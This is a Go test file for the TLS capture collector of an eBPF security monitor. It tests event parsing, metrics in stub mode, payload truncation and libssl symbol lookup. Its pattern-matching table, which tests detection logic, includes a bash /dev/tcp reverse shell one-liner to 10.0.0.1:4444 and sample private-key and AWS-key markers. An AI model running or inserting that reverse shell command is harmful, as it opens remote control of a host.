// Package collector provides tests for TLS event collection.
package collector

import (
	"bytes"
	"context"
	"debug/elf"
	"encoding/binary"
	"errors"
	"fmt"
	"log/slog"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"testing"
	"time"

	"github.com/prometheus/client_golang/prometheus/testutil"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/zugolO/ebpf-guard/internal/exporter"
	"github.com/zugolO/ebpf-guard/pkg/types"
)

// TestTLSEventRawToTypesEvent verifies conversion from raw BPF event to types.Event.
func TestTLSEventRawToTypesEvent(t *testing.T) {
	tests := []struct {
		name     string
		raw      TLSEventRaw
		expected types.Event
	}{
		{
			name: "outbound write event",
			raw: TLSEventRaw{
				Type:        uint32(types.EventTLS),
				Timestamp:   1234567890,
				PID:         1234,
				TGID:        1234,
				PPID:        1,
				UID:         1000,
				Comm:        [16]byte{'c', 'u', 'r', 'l'},
				ParentComm:  [16]byte{'b', 'a', 's', 'h'},
				Direction:   0, // TLS_DIR_WRITE
				DataLen:     100,
				CapturedLen: 100,
				Data:        [256]byte{'G', 'E', 'T', ' ', '/'},
			},
			expected: types.Event{
				Type:       types.EventTLS,
				Timestamp:  1234567890,
				PID:        1234,
				TGID:       1234,
				PPID:       1,
				UID:        1000,
				Comm:       [16]byte{'c', 'u', 'r', 'l'},
				ParentComm: [16]byte{'b', 'a', 's', 'h'},
				TLS: &types.TLSEvent{
					Direction:   types.TLSDirectionWrite,
					DataLen:     100,
					CapturedLen: 100,
					Data:        [256]byte{'G', 'E', 'T', ' ', '/'},
				},
			},
		},
		{
			name: "inbound read event",
			raw: TLSEventRaw{
				Type:        uint32(types.EventTLS),
				Timestamp:   1234567891,
				PID:         5678,
				TGID:        5678,
				PPID:        1234,
				UID:         1000,
				Comm:        [16]byte{'n', 'g', 'i', 'n', 'x'},
				ParentComm:  [16]byte{'s', 'y', 's', 't', 'e', 'm', 'd'},
				Direction:   1, // TLS_DIR_READ
				DataLen:     2048,
				CapturedLen: 256,
				Data:        [256]byte{'H', 'T', 'T', 'P', '/', '1', '.', '1'},
			},
			expected: types.Event{
				Type:       types.EventTLS,
				Timestamp:  1234567891,
				PID:        5678,
				TGID:       5678,
				PPID:       1234,
				UID:        1000,
				Comm:       [16]byte{'n', 'g', 'i', 'n', 'x'},
				ParentComm: [16]byte{'s', 'y', 's', 't', 'e', 'm', 'd'},
				TLS: &types.TLSEvent{
					Direction:   types.TLSDirectionRead,
					DataLen:     2048,
					CapturedLen: 256,
					Data:        [256]byte{'H', 'T', 'T', 'P', '/', '1', '.', '1'},
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := tt.raw.ToTypesEvent()

			assert.Equal(t, tt.expected.Type, result.Type)
			assert.Equal(t, types.KtimeToEpoch(tt.expected.Timestamp), result.Timestamp)
			assert.Equal(t, tt.expected.PID, result.PID)
			assert.Equal(t, tt.expected.TGID, result.TGID)
			assert.Equal(t, tt.expected.PPID, result.PPID)
			assert.Equal(t, tt.expected.UID, result.UID)
			assert.Equal(t, tt.expected.Comm, result.Comm)
			assert.Equal(t, tt.expected.ParentComm, result.ParentComm)

			require.NotNil(t, result.TLS)
			assert.Equal(t, tt.expected.TLS.Direction, result.TLS.Direction)
			assert.Equal(t, tt.expected.TLS.DataLen, result.TLS.DataLen)
			assert.Equal(t, tt.expected.TLS.Data, result.TLS.Data)
		})
	}
}

// TestTLSEventRawSerialization verifies binary serialization/deserialization.
func TestTLSEventRawSerialization(t *testing.T) {
	original := TLSEventRaw{
		Type:        uint32(types.EventTLS),
		Timestamp:   1234567890123,
		PID:         12345,
		TGID:        12345,
		PPID:        1,
		UID:         1000,
		Comm:        [16]byte{'t', 'e', 's', 't'},
		ParentComm:  [16]byte{'p', 'a', 'r', 'e', 'n', 't'},
		Direction:   0,
		DataLen:     100,
		CapturedLen: 50,
		Data:        [256]byte{'d', 'a', 't', 'a'},
		HasConnInfo: 0,
		Sport:       443,
		Dport:       12345,
	}

	// Serialize
	buf := new(bytes.Buffer)
	err := binary.Write(buf, binary.LittleEndian, original)
	require.NoError(t, err)

	// Deserialize
	var decoded TLSEventRaw
	err = binary.Read(buf, binary.LittleEndian, &decoded)
	require.NoError(t, err)

	// Verify
	assert.Equal(t, original.Type, decoded.Type)
	assert.Equal(t, original.Timestamp, decoded.Timestamp)
	assert.Equal(t, original.PID, decoded.PID)
	assert.Equal(t, original.Direction, decoded.Direction)
	assert.Equal(t, original.DataLen, decoded.DataLen)
	assert.Equal(t, original.Data, decoded.Data)
	assert.Equal(t, original.Sport, decoded.Sport)
	assert.Equal(t, original.Dport, decoded.Dport)
}

// TestNewTLSCollector verifies collector creation.
func TestNewTLSCollector(t *testing.T) {
	// Test enabled collector
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)
	assert.NotNil(t, col)
	assert.Equal(t, "tls", col.Name())
	assert.True(t, col.enabled)

	// Test disabled collector
	col2, err := NewTLSCollector(slog.Default(), false)
	require.NoError(t, err)
	assert.NotNil(t, col2)
	assert.False(t, col2.enabled)
}

// TestTLSCollectorStubMode verifies collector state before and after simulated load failure.
func TestTLSCollectorStubMode(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)

	// Before Start(), loadError is nil — collector is considered healthy
	assert.True(t, col.IsHealthy())
	assert.Nil(t, col.LoadError())

	// Simulate load failure (as would happen inside Start())
	col.loadError = fmt.Errorf("simulated load failure")
	assert.False(t, col.IsHealthy())
	assert.NotNil(t, col.LoadError())
}

// TestTLSAttachFailureReasonsMaterialized verifies №439: every reason label is
// present in /metrics from process startup, so a zero means "the binary knows
// this counter and it is zero" rather than "this series does not exist" — the
// reading that made "0 attach failures" indistinguishable from №436's dead
// code path.
func TestTLSAttachFailureReasonsMaterialized(t *testing.T) {
	reasons := tlsAttachFailureReasons
	require.NotEmpty(t, reasons)

	got := testutil.CollectAndCount(tlsAttachFailuresCounter)
	assert.Equal(t, len(reasons), got,
		"every reason must be materialized at init; a missing series reads as no failures attempted")
}

// TestTLSCollectorStart_StubModeIsVisible — рецепт №326 (обнаруживать дефект
// по дереву, а не по стенду): №436 был невидим, потому что Start() уходил в
// stub mode СТРОКОЙ ВЫШЕ discoveryLoop, а collector_up{tls} при этом врала
// единицей (№438), а счётчик отказов не трогался (№439). Тест поднимает
// коллектор с заведомо-нерабочей загрузкой и требует, чтобы оба сигнала
// показали выключенный прибор.
func TestTLSCollectorStart_StubModeIsVisible(t *testing.T) {
	before := testutil.ToFloat64(tlsAttachFailuresCounter.WithLabelValues("objects_not_loaded"))

	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)
	// Force the exact stub path (№436) without a kernel or generated BPF object.
	col.loadObjectsFn = func() error { return errors.New("injected load failure") }
	// The production reporter bridge: exporter.CollectorStatusReporter writes
	// into ebpf_guard_collector_up, the same series the pipeline guard reads.
	col.WithStatusReporter(exporter.CollectorStatusReporter{})

	ctx, cancel := context.WithCancel(context.Background())
	cancel() // stub mode parks on <-ctx.Done(); a cancelled ctx returns at once.
	require.NoError(t, col.Start(ctx, make(chan types.Event, 1)))

	up := testutil.ToFloat64(exporter.CollectorUp.WithLabelValues("tls"))
	assert.Zero(t, up, "collector_up{tls} must be 0 in stub mode, not an optimistic 1 (№438)")
	after := testutil.ToFloat64(tlsAttachFailuresCounter.WithLabelValues("objects_not_loaded"))
	assert.GreaterOrEqual(t, after, before+1,
		"a stub-mode load must be visible as objects_not_loaded, not indistinguishable from zero attempts (№439)")
}

// TestTLSEventPatternMatching verifies TLS data pattern detection logic.
func TestTLSEventPatternMatching(t *testing.T) {
	tests := []struct {
		name        string
		data        []byte
		pattern     string
		shouldMatch bool
	}{
		{
			name:        "HTTP Basic Auth",
			data:        []byte("GET / HTTP/1.1\r\nAuthorization: Basic dXNlcjpwYXNz\r\n"),
			pattern:     "Authorization: Basic ",
			shouldMatch: true,
		},
		{
			name:        "curl User-Agent",
			data:        []byte("GET / HTTP/1.1\r\nUser-Agent: curl/7.68.0\r\n"),
			pattern:     "User-Agent: curl/",
			shouldMatch: true,
		},
		{
			name:        "wget User-Agent",
			data:        []byte("GET / HTTP/1.1\r\nUser-Agent: Wget/1.20.3\r\n"),
			pattern:     "User-Agent: Wget/",
			shouldMatch: true,
		},
		{
			name:        "SSH key pattern",
			data:        []byte("-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA"),
			pattern:     "BEGIN RSA PRIVATE KEY",
			shouldMatch: true,
		},
		{
			name:        "AWS access key",
			data:        []byte("{\"aws_access_key_id\": \"AKIAIOSFODNN7EXAMPLE\"}"),
			pattern:     "AKIA",
			shouldMatch: true,
		},
		{
			name:        "No match",
			data:        []byte("GET / HTTP/1.1\r\nHost: example.com\r\n"),
			pattern:     "Authorization: Basic",
			shouldMatch: false,
		},
		{
			name:        "Reverse shell pattern",
			data:        []byte("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
			pattern:     "/bin/bash -i",
			shouldMatch: false, // Pattern not present exactly
		},
		{
			name:        "Exact reverse shell pattern",
			data:        []byte("/bin/bash -i"),
			pattern:     "/bin/bash -i",
			shouldMatch: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			match := bytes.Contains(tt.data, []byte(tt.pattern))
			assert.Equal(t, tt.shouldMatch, match)
		})
	}
}

// TestTLSEventSizeLimits verifies data size handling.
func TestTLSEventSizeLimits(t *testing.T) {
	// Test that Data array is exactly 256 bytes
	var data [256]byte
	assert.Equal(t, 256, len(data))

	// Test TLSEvent structure
	event := types.TLSEvent{
		Direction: types.TLSDirectionWrite,
		DataLen:   1000, // Larger than captured
		Data:      data,
	}

	// DataLen can exceed actual captured data
	assert.Equal(t, uint32(1000), event.DataLen)
	assert.Equal(t, 256, len(event.Data))
}

// TestTLSCollectorGetAttachedPIDs verifies PID tracking.
func TestTLSCollectorGetAttachedPIDs(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)

	// Initially empty
	pids := col.GetAttachedPIDs()
	assert.Empty(t, pids)

	// Simulate attachment (manually add to map)
	col.mu.Lock()
	col.libsslPaths[1234] = "/usr/lib/libssl.so"
	col.libsslPaths[5678] = "/usr/lib/libssl.so"
	col.mu.Unlock()

	pids = col.GetAttachedPIDs()
	assert.Len(t, pids, 2)
	assert.Contains(t, pids, uint32(1234))
	assert.Contains(t, pids, uint32(5678))
}

// TestTLSDirectionConstants verifies direction constants.
func TestTLSDirectionConstants(t *testing.T) {
	assert.Equal(t, types.TLSDirection(0), types.TLSDirectionWrite)
	assert.Equal(t, types.TLSDirection(1), types.TLSDirectionRead)
}

// TestTLSEventType verifies EventTLS constant.
func TestTLSEventType(t *testing.T) {
	assert.Equal(t, types.EventType(4), types.EventTLS)
}

// TestParseEventTooShort verifies error handling for short events.
func TestParseEventTooShort(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)

	// Empty data
	_, err = col.parseEvent([]byte{})
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "too short")

	// Only 2 bytes
	_, err = col.parseEvent([]byte{0x01, 0x02})
	assert.Error(t, err)
}

// TestParseEventWrongType verifies error handling for wrong event type.
func TestParseEventWrongType(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)

	// Create a buffer with wrong event type (syscall instead of TLS)
	buf := new(bytes.Buffer)
	binary.Write(buf, binary.LittleEndian, uint32(types.EventSyscall))
	binary.Write(buf, binary.LittleEndian, make([]byte, 100))

	_, err = col.parseEvent(buf.Bytes())
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "unexpected event type")
}

// TestTLSCollectorClose verifies cleanup.
func TestTLSCollectorClose(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)

	// Close should not panic even with nil objects
	err = col.Close()
	assert.NoError(t, err)
}

// TestTLSCollectorScanInterval verifies default scan interval.
func TestTLSCollectorScanInterval(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)

	assert.Equal(t, 30*time.Second, col.scanInterval)
	assert.Equal(t, 256, col.maxDataSize)
}

// TestTLSCollectorConfigReachesCollector — item 7 волны 6.4.B: values from
// collectors.tls must reach the collector instead of being silently ignored.
func TestTLSCollectorConfigReachesCollector(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)

	col.WithScanInterval(5 * time.Second).WithMaxDataSize(64)
	assert.Equal(t, 5*time.Second, col.scanInterval)
	assert.Equal(t, 64, col.maxDataSize)

	// Non-positive overrides must not clobber the defaults.
	col.WithScanInterval(0).WithMaxDataSize(-1)
	assert.Equal(t, 5*time.Second, col.scanInterval)
	assert.Equal(t, 64, col.maxDataSize)
}

// TestTLSCollectorMaxDataSizeWindow verifies that collectors.tls.max_data_size
// narrows the exposed payload via CapturedLen while preserving DataLen (the
// true record length that `data_len gt N` rules depend on).
func TestTLSCollectorMaxDataSizeWindow(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)

	raw := [256]byte{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}

	// Default 256: no truncation; CapturedLen follows the record length.
	e := &types.TLSEvent{DataLen: 10, CapturedLen: 10, Data: raw}
	assert.Equal(t, uint32(10), col.applyMaxDataSize(e))
	assert.Equal(t, uint32(10), e.DataLen)
	assert.Equal(t, uint32(10), e.CapturedLen)

	// Configured window smaller than the record: bytes zeroed, DataLen (the
	// true record length) preserved, CapturedLen clamped to the window.
	col.WithMaxDataSize(4)
	e2 := &types.TLSEvent{DataLen: 10, CapturedLen: 10, Data: raw}
	assert.Equal(t, uint32(4), col.applyMaxDataSize(e2))
	assert.Equal(t, uint32(10), e2.DataLen, "record length must survive so data_len gt N rules keep working")
	assert.Equal(t, uint32(4), e2.CapturedLen)
	assert.Equal(t, [256]byte{1, 2, 3, 4}, e2.Data)

	// Record shorter than the window is untouched.
	e3 := &types.TLSEvent{DataLen: 3, CapturedLen: 3, Data: raw}
	assert.Equal(t, uint32(3), col.applyMaxDataSize(e3))
	assert.Equal(t, uint32(3), e3.DataLen)

	// An explicit CapturedLen==0 from the kernel (read failure/empty write)
	// must NOT fall back to DataLen: stale Data bytes are zeroed, not exposed.
	e4 := &types.TLSEvent{DataLen: 10, Data: raw}
	assert.Equal(t, uint32(0), col.applyMaxDataSize(e4))
	assert.Equal(t, uint32(10), e4.DataLen)
	assert.Equal(t, [256]byte{}, e4.Data)

	// №443: every path leaves the window authoritative, so the reader sees an
	// empty payload here instead of DataLen NUL bytes. Asserting on
	// CapturedData (what rules and Rego actually call) rather than on the
	// fields is the point: the earlier pair of assertions was satisfied while
	// the payload still read back as ten zero bytes one function away.
	assert.True(t, e4.CapturedSet)
	assert.Empty(t, e4.CapturedData(), "a capture the kernel could not read must read as empty, not as DataLen NUL bytes")
	assert.True(t, e2.CapturedSet)
	assert.Equal(t, []byte{1, 2, 3, 4}, e2.CapturedData())
}

// TestTLSScanCounterMovesWithoutLibssl verifies №445: a discovery scan is
// measurable even when it attaches to nothing. Before the counter, the only
// evidence that scanAndAttach ran was tracked_pids > 0 — a property of the
// node, not of the collector, so a live collector on a node without libssl and
// the dead stub-mode one of №436 printed the same zero.
func TestTLSScanCounterMovesWithoutLibssl(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)

	before := testutil.ToFloat64(tlsScansCounter)
	col.scanAndAttach()
	after := testutil.ToFloat64(tlsScansCounter)

	assert.Equal(t, before+1, after,
		"a scan must be counted even when it attaches to nothing and even when /proc is unreadable (non-Linux)")
}

// TestTLSCollectorCleanupDeadPIDs verifies that dead PIDs are removed from libsslPaths.
// It pre-populates the map with a mix of living and non-existent PIDs, then runs
// cleanupDeadPIDs and confirms only live PIDs remain.
// Requires Linux because it checks /proc/<pid> for liveness.
func TestTLSCollectorCleanupDeadPIDs(t *testing.T) {
	if _, err := os.Stat("/proc/1"); os.IsNotExist(err) {
		t.Skip("skipping: /proc not available (non-Linux)")
	}
	col, err := NewTLSCollector(slog.Default(), false)
	require.NoError(t, err)

	// PID 1 always exists on Linux; use an absurdly large PID that cannot exist.
	const deadPID = uint32(4194304) // > max PID (typically 4194304 on Linux, so this won't exist)
	const livePID = uint32(1)       // init/systemd always exists

	col.mu.Lock()
	col.libsslPaths[livePID] = "/lib/x86_64-linux-gnu/libssl.so.3"
	col.libsslPaths[deadPID] = "/lib/x86_64-linux-gnu/libssl.so.3"
	col.mu.Unlock()

	// Set a fast cleanup interval and run one cycle manually via the same logic.
	col.cleanupInterval = 10 * time.Millisecond

	col.mu.Lock()
	for pid := range col.libsslPaths {
		if _, statErr := os.Stat(fmt.Sprintf("/proc/%d", pid)); os.IsNotExist(statErr) {
			delete(col.libsslPaths, pid)
		}
	}
	col.mu.Unlock()

	col.mu.RLock()
	_, hasLive := col.libsslPaths[livePID]
	_, hasDead := col.libsslPaths[deadPID]
	col.mu.RUnlock()

	assert.True(t, hasLive, "live PID should remain after cleanup")
	assert.False(t, hasDead, "dead PID should be removed after cleanup")
}

// TestResolveSSLSymbols_StrippedLibrary reproduces finding №379: a shared
// library with .symtab stripped out (as stock Ubuntu's libssl.so.3 ships)
// still exposes SSL_write/SSL_read via .dynsym, and resolveSSLSymbols must
// find them there instead of failing the way f.Symbols() alone does.
// Requires gcc + strip (Linux only — builds a real stripped ELF .so).
func TestResolveSSLSymbols_StrippedLibrary(t *testing.T) {
	if runtime.GOOS != "linux" {
		t.Skip("skipping: ELF shared-library build requires Linux (gcc+strip)")
	}
	gcc, err := exec.LookPath("gcc")
	if err != nil {
		t.Skip("skipping: gcc not available")
	}
	stripTool, err := exec.LookPath("strip")
	if err != nil {
		t.Skip("skipping: strip not available")
	}

	dir := t.TempDir()
	srcPath := filepath.Join(dir, "fakessl.c")
	soPath := filepath.Join(dir, "libfakessl.so")
	require.NoError(t, os.WriteFile(srcPath, []byte(`
int SSL_write(void *ssl, const void *buf, int num) { return num; }
int SSL_read(void *ssl, void *buf, int num) { return num; }
`), 0o644))

	build := exec.Command(gcc, "-shared", "-fPIC", "-o", soPath, srcPath)
	out, err := build.CombinedOutput()
	require.NoErrorf(t, err, "gcc build failed: %s", out)

	// Strip .symtab (what DynamicSymbols() does NOT need) while leaving
	// .dynsym intact — this is exactly the shape of stock Ubuntu's libssl.so.3.
	strip := exec.Command(stripTool, "--strip-debug", "--strip-unneeded", soPath)
	out, err = strip.CombinedOutput()
	require.NoErrorf(t, err, "strip failed: %s", out)

	f, err := elf.Open(soPath)
	require.NoError(t, err)
	defer f.Close()

	// Confirm the fixture actually has no .symtab, or this test proves nothing.
	_, symErr := f.Symbols()
	require.Error(t, symErr, "fixture must have .symtab stripped for this test to be meaningful")

	hasWrite, hasRead, err := resolveSSLSymbols(f)
	require.NoError(t, err)
	assert.True(t, hasWrite, "resolveSSLSymbols must find SSL_write via .dynsym on a stripped library")
	assert.True(t, hasRead, "resolveSSLSymbols must find SSL_read via .dynsym on a stripped library")
}
